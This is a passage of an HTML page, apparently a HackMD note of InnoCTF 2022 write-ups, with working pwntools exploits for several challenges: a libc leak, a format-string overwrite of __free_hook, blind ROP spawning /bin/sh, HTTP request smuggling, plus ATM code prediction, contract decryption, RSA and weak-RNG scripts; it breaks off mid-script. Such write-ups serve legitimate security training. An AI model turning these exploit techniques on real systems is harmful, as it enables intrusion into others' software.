@@ -1,0 +1,1657 @@
+<!DOCTYPE html>
+<html lang="dev">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="csrf-token" content="Neni0DWd-ylZLQ5vf0QB08VmWDaZ_E8zzD9U">
+    
+    
+    <meta name="description" content="   InnoCTF 2022 Write-ups ===  ![](https://i.imgur.com/HylWQGw.jpg)  Арара́т (тур. Ağrı Dağı, арм. Ա">
+    
+    <title>InnoCTF 2022 Write-ups - HackMD</title>
+    <link rel="icon" type="image/png" href="../favicon.png">
+	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+    
+<script nonce="da2c10eb-1e2e-4b50-9371-9a413d0a44f7">
+  window.domain = 'hackmd.io'
+  window.urlpath = ''
+  window.debug = false
+  window.version = '1.3.0'
+  window.brand = 'HackMD'
+
+  
+  window.NOTE_ID = 'XfaFuhlKQ_erEroaOypaPA'
+  
+
+  window.GOOGLE_API_KEY = 'AIzaSyCjSrqWHhmWJnoI7JlD88XDSaBgiKbaenA'
+  window.GOOGLE_CLIENT_ID = '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com'
+  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
+  
+  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'
+
+  window.ASSET_URL = 'https://assets.hackmd.io'
+
+  window.USER_CAN_CREATE_TEAM = true
+  window.USER_CAN_DELETE_ACCOUNT = true
+  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
+  window.PAYMENT_ENABLED = true
+  window.PAYMENT_PROMOTION_BANNER_ENABLED = 
+  window.GITHUB_SYNC_ENABLED = true
+  window.GITLAB_SYNC_ENABLED = false
+  window.GITLAB_SYNC_BASE_URL = ''
+  window.VCS_SYNC_MODE = 'github'
+  window.VCS_PROVIDER_NAME = 'GitHub'
+  window.FREE_TEAM_NUM = 20
+  window.FREE_TEAM_MEMBER_NUM = 3
+  window.FREE_PUBLIC_TEAM_NUM = 10
+  
+  window.EE_SITE_ENABLE = false
+  window.EE_SITE_NAME = 'false'
+  window.EE_SITE_LINK = 'false'
+  window.EESITE_INFO = false
+  window.ENTERPRISE_DISCOVERY_ENABLE = false
+  window.ENTERPRISE_DISCOVERY_TEAM = true
+  window.ENTERPRISE_DISCOVERY_NOTE = true
+  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
+  
+  window.ALLOW_ANONYMOUS = true
+  window.ALLOW_ANONYMOUS_EDIT = false
+  window.PUBLIC_OVERVIEW = false
+  window.INTERNAL_PUBLIC_OVERVIEW = false
+  window.FULL_TEXT_SEARCH_ENABLE = false
+  window.MARKETING_EMAIL_ENABLE = true
+  
+  window.API_MANAGEMENT_UI_ENABLE = true
+  window.FEEDBACK_UI_ENABLE = true
+
+  
+  window.SHOW_HOT_NOTES = false
+  
+
+  
+  window.HOT_NOTES_TIME_TYPE = 'week'
+  
+
+  
+  window.SHOW_OVERVIEW = false
+  
+
+  
+  window.MENTIONS = {}
+  
+
+  
+  window.MENTION_ANCHORS = []
+  
+
+  
+  window.COMMENT_ANCHORS = []
+  
+
+  
+  window.IS_OWNER = false
+  
+
+  
+  window.IS_TEAM_ADMIN = false
+  
+
+  
+  window.IS_INVITEE_ADMIN = false
+  
+
+  
+  window.USER_PROFILE = {"name":"Guest Osborne"}
+  
+
+  
+  window.VERSION_TIME = '1649689294806'
+  
+
+  
+  window.canEdit = false
+  
+
+  
+  window.canWriteComment = false
+  
+</script>
+
+
+    
+<!-- Google Tag Manager -->
+<script nonce="da2c10eb-1e2e-4b50-9371-9a413d0a44f7">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
+<!-- End Google Tag Manager -->
+
+
+    
+
+
+
+<meta property="fb:app_id" content="1436904003272070">
+
+
+    <meta name="twitter:image:src" content="https://www.gravatar.com/avatar/f491ba58cd93b5ab2c2bcff095e99495?s=400" />
+
+
+<meta name="twitter:site" content="@hackmdio" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="InnoCTF 2022 Write-ups - HackMD" />
+
+
+    <meta name="twitter:description" content="   InnoCTF 2022 Write-ups ===  ![](https://i.imgur.com/HylWQGw.jpg)  Арара́т (тур. Ağrı Dağı, арм. Ա" />
+
+
+
+    <meta property="og:image" content="https://www.gravatar.com/avatar/f491ba58cd93b5ab2c2bcff095e99495?s=400" />
+
+
+<meta property="og:site_name" content="HackMD" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="InnoCTF 2022 Write-ups - HackMD" />
+
+
+    <meta property="og:description" content="   InnoCTF 2022 Write-ups ===  ![](https://i.imgur.com/HylWQGw.jpg)  Арара́т (тур. Ağrı Dağı, арм. Ա" />
+
+
+    <link rel="stylesheet" href='https://assets.hackmd.io/build/emojify.js/dist/css/basic/emojify.min.css'>
+     <link href="https://assets.hackmd.io/build/font-vendor.808f75da673962c80518.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.1233bc7a27f833ea4984.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.384d1aed526f4021254e.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.964baf1aefb3660cf304.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+<![endif]-->
+
+</head>
+
+<body style="display:none;">
+    <div class="ui-infobar container-fluid unselectable hidden-print">
+        <div class="row">
+            <div class="col-xs-12 ui-infobar-inner">
+                <div class="ui-infobar__user-info">
+                    <ul class="list-inline">
+                        <li>
+                            
+                                <span class="ui-lastchangeuser" data-profile="Louie">&thinsp;<a class="ui-user-icon small" style="background-image: url(https://www.gravatar.com/avatar/f491ba58cd93b5ab2c2bcff095e99495?s=96);" target="_blank"></a></span>
+                            
+                            &nbsp;<span class="text-uppercase ui-status-lastchange"></span>
+                            <span class="ui-lastchange text-uppercase" data-createtime="Sun Apr 10 2022 04:36:17 GMT+0000 (Coordinated Universal Time)" data-updatetime="Mon Apr 11 2022 15:01:34 GMT+0000 (Coordinated Universal Time)"></span>
+                        </li>
+                        
+                        
+                        <li>
+                            <span class="ui-more-info hmd-dn" data-toggle="popover">
+                                &thinsp;<i class="fa fa-info-circle" aria-hidden="true"></i>
+
+                                <div class="more-info-raw hmd-dn">
+                                    <span class="ui-published-note note-status-row hmd-dn">
+                                        <i class="fa fa-globe" aria-hidden="true" style="margin-top: 1px;"></i>
+                                        Published
+                                    </span>
+
+                                    <span class="ui-connectedGithub note-status-row hmd-dn">
+                                        <i class="fa fa-20 ui-connectedGithubIcon fa-github"></i>
+
+                                        <span>Linked with GitHub</span>
+
+                                        <br>
+
+                                        <a class="file-path" target="_blank"></a>
+                                    </span>
+                                </div>
+                            </span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="hmd-text-right ui-infobar__actions">
+                    <ul class="list-inline">
+                        <li>
+                            
+                                <a class="ui-signin community-button hidden-xs" href="HyYTA0J45.html#"><span class="text"><i class="fa fa-fw fa-heart-o"></i>Like<span class="count"></span></span></a>
+                                <a class="ui-signin community-button hidden-xs" href="HyYTA0J45.html#"><span class="text"><i class="fa fa-fw fa-bookmark-o"></i>Bookmark</span></a>
+                                <a class="ui-signin community-button hidden-xs" href="HyYTA0J45.html#"><span class="text"><i class="fa fa-fw fa-bell-o"></i>Subscribe</span></a>
+                            
+                        </li>
+                        
+                    </ul>
+                </div>
+
+                <div class="clearfix"></div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- Markdown rendered container -->
+    <div id="doc" class="container-fluid markdown-body" data-hard-breaks="true">---
+title: &#39;InnoCTF 2022 Write-ups&#39;
+---
+
+
+InnoCTF 2022 Write-ups
+===
+
+![](https://i.imgur.com/HylWQGw.jpg)
+
+Арара́т (тур. Ağrı Dağı, арм. Արարատ и арм. Մասիս (Масис), курд. Çiyayê Agirî) — гора: самый высокий вулканический массив Армянского нагорья на востоке Турции; относится к стратовулканам. Находится в Ыгдыре по правому берегу среднего течения реки Аракс в 16 километрах от границы с Ираном, в 32 километрах от границы с Арменией. Состоит из двух слившихся основаниями конусов спящих вулканов: Большого Арарата и Малого Арарата. Вершина Большого Арарата (5165 метров над уровнем моря) является самой высокой точкой Турции. Расстояние между соседними конусами составляет 11 км.
+
+## Table of Contents
+
+[TOC]
+
+# Binary exploitation
+
+## kazino
+
+```python=
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template &#39;--host=127.0.0.1&#39;
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch=&#39;amd64&#39;)
+exe = &#39;./vuln&#39;
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or &#39;127.0.0.1&#39;
+port = int(args.PORT or 1337)
+
+def local(argv=[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = &#39;&#39;&#39;
+continue
+&#39;&#39;&#39;.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+offset = 0x3eb1c0
+libc = ELF(&#39;./libc.so.6&#39;)
+
+io = start()
+
+io.sendline(&#39;3&#39;);
+io.sendline(&#39;no&#39;)
+io.readuntil(&#39;gift&#39;)
+leak = int(io.readline().split(b&#39;*&#39;)[2][2:], 16)
+libc_base = leak - libc.symbols[&#39;puts&#39;]
+log.success(f&#39;LIBC BASE: {hex(libc_base)}&#39;)
+
+for i in range(64):
+    io.sendline(&#39;2&#39;)
+    io.sendline(hex(offset + libc_base + i))
+
+for i in range(10):
+    io.sendline(&#39;1&#39;)
+
+io.readuntil(&#39;[PRIZE]&#39;)
+flag = io.readline()
+log.success(f&#39;FLAG: {flag[2:-1]}&#39;)
+```
+
+## Relax pwn
+
+```python=
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template &#39;--host==127.0.0.1&#39;
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch=&#39;amd64&#39;)
+exe = &#39;./vuln&#39;
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or &#39;127.0.0.1&#39;
+port = int(args.PORT or 1337)
+
+def local(argv=[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = &#39;&#39;&#39;
+continue
+&#39;&#39;&#39;.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def encrypt(data):
+    return b&#39;&#39;.join([bytes([data[i] ^ 0xff]) for i in range(len(data))])
+
+one_gadget1 = 0x4f3d5 #execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
+#constraints:
+#  rsp &amp; 0xf == 0
+#  rcx == NULL
+one_gadget2 = 0x4f432 #execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
+#constraints:
+#  [rsp+0x40] == NULL
+one_gadget3 = 0x10a41c #execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
+#constraints:
+#  [rsp+0x70] == NULL
+#free_hook = 0x1d1e20
+free_hook = 0x3ed8e8
+
+io = start()
+
+p = b&#39;AAAAAAAA&#39;+b&#39;|%p&#39;*64+b&#39;|ENDSTR&#39;
+io.sendline(p)
+io.sendline(b&#39;&#39;)
+
+data = io.recvuntil(b&#39;ENDSTR&#39;).split(b&#39;|&#39;)
+libc_base = int(data[1][2:], 16) - 0x3ec7e3
+#libc_base = int(data[1][2:], 16) - 0x1cf743
+log.success(f&#39;LIBC BASE: {hex(libc_base)}&#39;)
+
+byte1 = (((one_gadget2 + libc_base) &amp; 0xff) - 2)
+byte2 = (((one_gadget2 + libc_base) &amp; 0xffff) &gt;&gt; 8) - byte1 - 4
+byte3 = (((one_gadget2 + libc_base) &amp; 0xffffff) &gt;&gt; 16) - byte2 - 32 - 22
+byte4 = (((one_gadget2 + libc_base) &amp; 0xffffffff) &gt;&gt; 24) - byte3 - byte2 - 34 + 234
+byte5 = (((one_gadget2 + libc_base) &amp; 0xffffffffff) &gt;&gt; 32) - byte4 - byte3 - byte2 - 36 - 22
+byte6 = (((one_gadget2 + libc_base) &amp; 0xffffffffffff) &gt;&gt; 40) - byte5 - byte4 - byte3 - byte2 - 38 - 22
+
+while byte1 &gt; byte2:
+    byte2 += 0x100
+while byte2 &gt; byte3:
+    byte3 += 0x100
+while byte3 &gt; byte4:
+    byte4 += 0x100
+while byte4 &gt; byte5:
+    byte5 += 0x100
+while byte5 &gt; byte6:
+    byte6 += 0x100
+
+p = b&#39;&#39;
+p += b&#39;|%&#39; + bytes(str(byte1), &#39;ASCII&#39;) + b&#39;x|%26$hhn&#39;
+p += b&#39;|%&#39; + bytes(str(byte2), &#39;ASCII&#39;) + b&#39;x|%27$hhn&#39;
+p += b&#39;|%&#39; + bytes(str(byte3), &#39;ASCII&#39;) + b&#39;x|%28$hhn&#39;
+p += b&#39;|%&#39; + bytes(str(byte4), &#39;ASCII&#39;) + b&#39;x|%29$hhn&#39;
+p += b&#39;|%&#39; + bytes(str(byte5), &#39;ASCII&#39;) + b&#39;x|%30$hhn&#39;
+p += b&#39;|%&#39; + bytes(str(byte6), &#39;ASCII&#39;) + b&#39;x|%31$hhn&#39;
+p += b&#39;|%26$s|ENDSTR&#39;
+p = p.ljust(128, b&#39;A&#39;)
+p += p64(free_hook + libc_base)
+p += p64(free_hook + libc_base + 1)
+p += p64(free_hook + libc_base + 2)
+p += p64(free_hook + libc_base + 3)
+p += p64(free_hook + libc_base + 4)
+p += p64(free_hook + libc_base + 5)
+
+io.sendline(p)
+io.sendline(b&#39;&#39;)
+
+data = io.recvuntil(b&#39;ENDSTR&#39;).split(b&#39;|&#39;)
+print(hex(libc_base + one_gadget2))
+print(hex(u64(data[-2].ljust(8, b&#39;\x00&#39;))))
+
+#print(data)
+
+io.interactive()
+```
+
+## Blind mole
+
+1. Find buf len
+2. Find memory leak (printf in this case)
+4. Find `pop` gadget (pop rsi)
+5. leak binary
+6. ???
+7. PWN!
+
+```python=
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template &#39;--host==127.0.0.1&#39;
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch=&#39;i386&#39;)
+exe = &#39;./task&#39;
+
+context.log_level = &#39;error&#39;
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or &#39;127.0.0.1&#39;
+port = int(args.PORT or 1337)
+
+def local(argv=[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = &#39;&#39;&#39;
+continue
+&#39;&#39;&#39;.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+base = 0x400000
+
+def find_buflen():
+    for i in range(0, 512, 8):
+        io = start()
+        try:
+            io.sendline(b&#39;A&#39;*i)
+            io.readline()
+            io.readline()
+        except:
+            print(f&#39;[+] Buffer length found: {i}&#39;)
+            return i
+        io.close()
+
+
+def find_leak(length):
+    for i in range(base+0x1000, base+0x2000, 1):
+        sleep(0.01)
+        io = start()
+#        print(f&#39;[+] {hex(i)}&#39;)
+        try:
+            p = b&#39;&#39;
+            p += b&#39;A&#39;*(length - 1)
+            p += b&#39;\x00&#39;
+            p += p64(i)
+            io.sendline(p)
+            io.sendline(&#39;asd&#39;) # in case if read called
+            io.readline()
+            a = io.read()
+#            print(a)
+            if b&#39;Hello AAAA&#39; in a:
+                print(f&#39;[+] MEM leak {hex(i)}: {a}&#39;)
+                io.close()
+                return i
+        except Exception as err:
+            io.close()
+        io.close()
+
+def find_poprsi(length, leak):
+    for i in range(base+0x1000, base+0x2000, 1):
+        sleep(0.01)
+        io = start()
+#        print(f&#39;[+] {hex(i)}&#39;)
+        try:
+            p = b&#39;&#39;
+            p += b&#39;A&#39;*(length - 1) 
+            p += b&#39;\x00&#39;
+            p += p64(i)
+            p += p64(base + 1)
+            p += b&#39;JUNKJUNK&#39;
+            p += p64(i+3)
+            p += p64(leak)
+#            print(len(p))
+            io.sendline(p)
+            io.send(b&#39;asd\n&#39;) # in case if read called
+            io.readline()
+            a = io.read()
+            if b&#39;ELF&#39; in a:
+                print(f&#39;[+] MEM leak {hex(i)}: {a}&#39;)
+                io.close()
+                return i
+        except Exception as e:
+#            print(repr(e))
+            io.close()
+        io.close()
+
+def dump(length, leak, poprsi):
+    l = 0
+    while True:
+        f = open(&#39;dump&#39;, &#39;ab&#39;)
+        if &#39;0a&#39; in hex(base + l):
+            f.write(b&#39;\x00&#39;)
+            f.flush()
+            f.close()
+            l += 1
+            continue
+        sleep(0.01)
+        io = start()
+        p = b&#39;&#39;
+        p += b&#39;A&#39;*(length - 1) 
+        p += b&#39;\x00&#39;
+        p += p64(poprsi)
+        p += p64(base + l)
+        p += b&#39;JUNKJUNK&#39;
+        p += p64(poprsi + 3)
+        p += p64(leak)
+        io.sendline(p)
+        try:
+            io.readline()
+            io.recvuntil(b&#39;Hello &#39;)
+        except:
+            io.close()
+            f.flush()
+            f.close()
+            continue
+        a = io.read()
+        f.write(a[:-2] + b&#39;\x00&#39;)
+        f.flush()
+        f.close()
+        io.close()
+        print(f&#39;[+] {hex(base + l)}:{a[:-2]}&#39;)
+        l += len(a) - 1
+        if l &gt;= 0x5000:
+            break
+
+
+length = find_buflen()
+leak = find_leak(length)
+poprsi = find_poprsi(length, leak)
+#dump(length, leak, poprsi)
+
+puts = 0x401040
+printf_got = 0x404028
+puts_got = 0x404018
+func = 0x4011c9
+poprdi = 0x4012fb
+
+libc = ELF(&#39;libc.so.6&#39;)
+io = start()
+
+p = b&#39;&#39;
+p += b&#39;A&#39;*(length - 1)
+p += b&#39;\x00&#39;
+p += p64(poprdi)
+p += p64(printf_got)
+p += p64(poprsi + 3)
+p += p64(puts)
+p += p64(poprdi)
+p += p64(puts_got)
+p += p64(poprsi + 3)
+p += p64(puts)
+p += p64(poprsi + 3)
+p += p64(func)
+
+io.sendline(p)
+io.readline()
+a = u64(io.read(7)[:-1].ljust(8, b&#39;\x00&#39;))
+b = u64(io.read(7)[:-1].ljust(8, b&#39;\x00&#39;))
+print(f&#39;[+] printf: {hex(a)}&#39;)
+print(f&#39;[+] puts: {hex(b)}&#39;)
+libc_base = b - libc.symbols[&#39;puts&#39;]
+print(f&#39;[+] libc base: {hex(libc_base)}&#39;)
+
+p = b&#39;&#39;
+p += b&#39;A&#39;*(length-1)
+p += b&#39;\x00&#39;
+p += p64(poprdi)
+p += p64(next(libc.search(b&#39;/bin/sh\0&#39;)) + libc_base)
+p += p64(poprsi+3)
+p += p64(libc.symbols[&#39;system&#39;] + libc_base)
+
+io.sendline(p)
+
+io.interactive()
+```
+
+## Super Server 0.0.1
+
+Send two http request in one tcp session
+
+```python=
+from pwn import *
+import sys
+
+
+if len(sys.argv) != 3:
+  print(&#39;[!] Usage:&#39;, sys.argv[0], &#39;ip port&#39;)
+  sys.exit()
+
+r = remote(sys.argv[1], sys.argv[2])
+
+p = &#39;&#39;
+p += &#39;GET /flag.txt HTTP/1.1\r\n&#39;
+r.send(p)
+p = &#39;&#39;
+p += &#39;POST /api/reflect HTTP/1.1\r\n&#39;
+p += &#39;Content-Length: 1024\r\n\r\n&#39;
+p += &#39;asd=dsa&#39;
+r.send(p)
+r.interactive()
+```
+
+# Reverse
+
+## Armenian ATM
+
+Author: @passkeyra
+
+There are two functions in the Dispenser class - one for the deposit, the other for the withdrawal of money. When depositing, money is placed in deposit cassettes, when issuing, they are issued from cassettes for issuing, respectively (moreover, each bill is placed or taken from the cassette with its denomination). It is necessary to almost completely empty the withdrawal cassettes and almost completely fill the deposit cassettes (leaving 2000 in the first and not adding 2000 to the end in the second), after which the ATM enters the service mode. In this mode, it requests a code that is generated at the start of the ATM based on the current timestamp (the time of the ATM is printed to the console at startup). The code is 33 random bytes encoded base64 with a custom alphabet. Then the solution will be the following sequence of actions:
+
+
+* `nc &lt;task ip&gt; 8082`
+* enter the card data
+* take current time, convert to timestamp
+* Send 499 time the following (to withdraw and deposit cash, emptying and filling cassettes by 37000 each time):
+```
+1
+37000
+2
+37000
+```
+* Send the following to left 2000 in withdraw casset and not adding 2000 to the end in deposit:
+
+```
+1
+35000
+2
+35000
+```
+
+* Generate a code based on got timestamp:
+```c=
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;time.h&gt;
+#include &lt;vector&gt;
+
+using namespace std;
+
+const string alphabet = &#34;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890+/&#34;;
+
+int main() {
+    int ts;
+    cin &gt;&gt; ts;
+    srand(ts);
+
+    vector&lt;unsigned char&gt; tmp;
+    for (int i = 0; i &lt; 33; i++){
+        unsigned char x = rand() % 256;
+        tmp.push_back(x);
+    }
+    string code = &#34;&#34;;
+
+    for (int i = 0; i &lt; 33; i+=3){
+        int n1 = (tmp[i] &gt;&gt; 2) &amp; 63;
+        int n2 = ((tmp[i] &amp; 3) &lt;&lt; 4) | ((tmp[i+1] &gt;&gt; 4) &amp; 15);
+        int n3 = ((tmp[i+1] &amp; 15) &lt;&lt; 2) | ((tmp[i+2] &gt;&gt; 6) &amp; 3);
+        int n4 = tmp[i+2] &amp; 63;
+        code += alphabet[n1];
+        code += alphabet[n2];
+        code += alphabet[n3];
+        code += alphabet[n4];
+    }
+    cout &lt;&lt; code &lt;&lt; endl;
+    return 0;
+}
+```
+* enter the code and get the flag
+
+
+## Important
+
+Author: @passkeyra
+
+Go to Binance Smart Chain Explorer and search by contract address: https://testnet.bscscan.com/address/0x92dF986e7B002fA9Eb2eDd04125204CACDb36f30. We can see in the source code that there is a key passed in the constructor, so, we need to get it from the first transaction of contract creation. Go to it https://testnet.bscscan.com/tx/0x1a4ec912cb6190283a60cba95fbbebc2f0517507c2598b813cc85106db3a3a1e and get the key from input data (last 32 bytes is the argument to the constructor):
+
+![](https://i.imgur.com/CNDNiDw.png)
+
+Then we can see that it has 2 transactions of adding data, then 2 transactions of decrypting it, and 2 transactions of adding again. So, our task is to decrypt the data added in the last 2 transactions (we need to take encrypted data from them), but we cannot call the decrypt function, since we are not the contract owner.
+
+From the source code it is seen that it calls some side Decryptor contract, for which we don&#39;t have a source (look at internal transactons https://testnet.bscscan.com/address/0x92dF986e7B002fA9Eb2eDd04125204CACDb36f30#internaltx to get the contract address 0xf9893d10153B62A38A37AA40e1A597AB984dCfEc). Take the contract bytecode and decompile here, for example: https://ethervm.io/decompile. The full decompiled algorithm of `decrypt(uint256 data, uint256 key, uint256 prev)` is on the screenshot:
+
+![](https://i.imgur.com/Ukpb9PS.png)
+
+The operator `~` is actually the xor operation (we can see it from disassembled bytecode bellow), var2 is data, var3 is key, and var4 is prev. The the decryption algorithm:
+
+```python=
+k = 0x0960f2e71aa2d9dbbb857bb7f90a8ec8b5dd63848d38a74a9fe6cce29a0c589c
+
+def decrypt_part(data, key, prev):
+    data = data &amp; (2 ** 256-1)
+    key = key &amp; (2 ** 256-1)
+    prev = prev &amp; (2 ** 256-1)
+
+    p1 = (prev &amp; 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000) &gt;&gt; 128
+    p2 = prev &amp; 0xffffffffffffffffffffffffffffffff
+
+    z1 = data &amp; 0xffffffffffffffffffffffffffffffff
+    z2 = (data &amp; 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000) &gt;&gt; 128
+    z1 ^= p1
+    z2 ^= p2
+
+    k1 = (key &amp; 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000) &gt;&gt; 128
+    k2 = key &amp; 0xffffffffffffffffffffffffffffffff
+    y1 = z2 ^ k1
+    y2 = z1 ^ k2
+
+    a = 0x13371337133713371337133713371337
+    b = 0x37133713371337133713371337133713
+
+    x1 = y2 ^ a
+    x2 = y1 ^ b
+
+    result = (x1 &lt;&lt; 128) | x2
+
+    return result
+
+d_enc = [0x89bf655de13c68683a04c36b4392274a1867ee3e008430ce431e4b7537b0eb20, 0x26142bca2d35de06cf8807d1f9a952fb5b0a56de1147ae21d5a161becaa96ce1]
+d_dec = []
+iv = 2 ** 256 - 1
+for i in d_enc:
+    dec = decrypt_part(i, k, iv)
+    iv = i
+    d_dec.append(dec)
+
+print(&#39;uint256[] decrypted data:&#39;, list(map(hex, d_dec)))
+```
+
+
+
+# Crypto
+
+## RSA
+
+Author: @Nmikryukov
+
+https://crypto.stackexchange.com/questions/2323/how-does-a-chosen-plaintext-attack-on-rsa-work
+
+```python=
+from base64 import b64encode, b64decode
+from gmpy2 import gmpy2
+
+
+def bytes_to_n(b):
+    n, p = 0, 1
+    for byte in b:
+        n += byte * p
+        p *= 256
+    return n
+
+
+def n_to_bytes(n):
+    b = []
+    while n:
+        b.append(n % 256)
+        n //= 256
+    return bytes(b)
+
+
+N = int(input(&#34;N: &#34;))
+e = 257
+# need to iterate over all phrases using script. Done here manually
+while True:
+    encrypted = bytes_to_n(b64decode(input(&#34;encrypted phrase: &#34;)))
+    twopow = gmpy2.powmod(2, e, N)
+    need_decrypt = twopow * encrypted
+    print(b64encode(n_to_bytes(need_decrypt)).decode())
+    twom = bytes_to_n(b64decode(input(&#34;decrypted: &#34;)))
+    print(n_to_bytes(twom // 2))
+```
+
+## Insecure channel
+
+Author: @passkeyra
+
+The task uses not strong random function and encryption of the new key during its sending. The full exploit will be the following:
+
+```python=
+import time
+import re
+import socket
+from Crypto.Cipher import AES
+
+seed = 0
+
+IP = &#39;51.250.81.57&#39;
+PORT = 8083
+
+def srand(s):
+    global seed
+    seed = s % (2 ** 31)
+
+def rand():
+    global seed
+    seed = (0x10001 * seed) % (2 ** 31)
+    return seed
+
+def create_random_table(s):
+    srand(s)
+    table = []
+    first = rand()
+    second = rand()
+    iters = 0
+    table.append(first)
+    table.append(second)
+    while True:
+        r1 = rand()
+        r2 = rand()
+        iters += 2
